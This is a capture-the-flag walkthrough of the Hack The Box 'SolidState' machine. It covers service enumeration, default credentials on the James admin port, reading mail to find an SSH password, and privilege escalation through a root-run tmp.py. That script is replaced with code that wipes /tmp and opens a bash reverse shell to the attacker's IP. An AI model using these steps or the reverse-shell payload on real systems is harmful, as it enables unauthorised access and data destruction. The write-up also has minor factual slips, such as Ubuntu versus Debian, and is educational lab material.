
![logo](/logo.png)

# [SolidState- BOX]  
Hi folks, today I am going to solve an Medium rated hack the box machine which was released on 08 Sep 2017 machine on HTB,SolidState created by [ch33zplz](https://app.hackthebox.com/users/3338) .So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *Apache
  *James 
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/solidstate 10.10.10.51
```

###### Output 

![](/Linux/Linux-Medium/SolidState/Screenshots/nmap.png)

```sh
 nmap -sV -sC -oA nmap/solidstate 10.10.10.51                                                                                      ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-06 19:30 EAT
Nmap scan report for 10.10.10.51
Host is up (0.34s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.15 [10.10.14.15])
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp open  pop3?
119/tcp open  nntp    JAMES nntpd (posting ok)
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 294.73 seconds
```

looking at the results  we find out that there are 5 ports open and its a `Ubuntu`and its running an `Apache James`. 
port[22]-ssh
port[25]-smtp
port[80]-  httpd 2.4.25
port[110]-pop3
port[119]-nntp

so when we go the browser at [http://10.10.10.51](http://10.10.10.51) solid state security website
 
![](/Linux/Linux-Medium/SolidState/Screenshots/home.png)

looking at the page i find nothing of interesting so let me start gobuster to enumerate active directories.

```sh
gobuster dir -u http://10.10.10.51 -w /usr/share/wordlists/dirb/common.txt -k --no-error
```

![](/Linux/Linux-Medium/SolidState/Screenshots/gobuster.png)

I find nothing of interesting from the gobuser but looking at the nmap i saw apache james listenning in different ports.

James Mail Server is listening on four ports with different functions. Simple Mail Transfer Protocol (SMTP) on TCP 25, Post Office Protocol (POP3) on TCP 110, and Network News Transfer Protocol (NNTP) on TCP 119 are all services that this box is offering. I could look at potentially brute forcing valid user names or sending phishing emails, but first I want to look at port 4555.

TCP port 4555 is interesting because it is the James administration port. Even without an exploit, if I can access this service, I can likely get into things that might be useful. so lets look for the exploit 

```sh
searchsploit james 2.3.2
```

![](/Linux/Linux-Medium/SolidState/Screenshots/searchsploit.png)

here is a remote code execution vulnerability, however it requires valid credentials. I can connect to 4555 with `nc`, and I’m prompted to login. The default creds of `root/root` work:

![](/Linux/Linux-Medium/SolidState/Screenshots/nc.png)

i can get a list of commands by using `help` the now from teir i can see a commdand to list user accounts.

![](/Linux/Linux-Medium/SolidState/Screenshots/telnet.png)

I can change the password for each

![](/Linux/Linux-Medium/SolidState/Screenshots/setpasswd.png)

For each account, I can now connect to TCP 110 (POP3) to check mail. `telnet` works best to connect to POP3. The first user, james, has no messages:

```sh
telnet 10.10.10.51 110
```

I find something interesting in john which leads me all way to `mindy`

![](/Linux/Linux-Medium/SolidState/Screenshots/mindy.png)

from the second message i find a password.

![](/Linux/Linux-Medium/SolidState/Screenshots/retr.png)


now lets ssh into the box with mindy as the user and the passord found earlier

```sh
ssh mindy@10.10.10.51
```

![](/Linux/Linux-Medium/SolidState/Screenshots/ssh.png)

and we can find the user text from 

![](/Linux/Linux-Medium/SolidState/Screenshots/userflag.png)

we can also use the exploit earlier we foud in the searchsploit 

![](/Linux/Linux-Medium/SolidState/Screenshots/exploit.png)


now that we have access to mindy let us install `LinEnum` to execute privsecs

```
 python 50347.py 10.10.10.51 10.10.14.5 443 
```


looking at the nc set then i find  a more interactive shell 

![](/Linux/Linux-Medium/SolidState/Screenshots/interactive.png)

so let us be able to run Linpeas to find privsec

![](/Linux/Linux-Medium/SolidState/Screenshots/Linenum.png)

from the LinEnum i find something interesting `tmp.py` being runned by root 

![](/Linux/Linux-Medium/SolidState/Screenshots/tmp.png)

let now replace a reverse shell with an exploit 

```sh
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
os.system('bash -c "bash -i >& /dev/tcp/10.10.14.5/1339 0>&1"')
```

now then we set a listner then we get root

![](/Linux/Linux-Medium/SolidState/Screenshots/root.png)

	-------------------------END successful attack @lesley----------------------
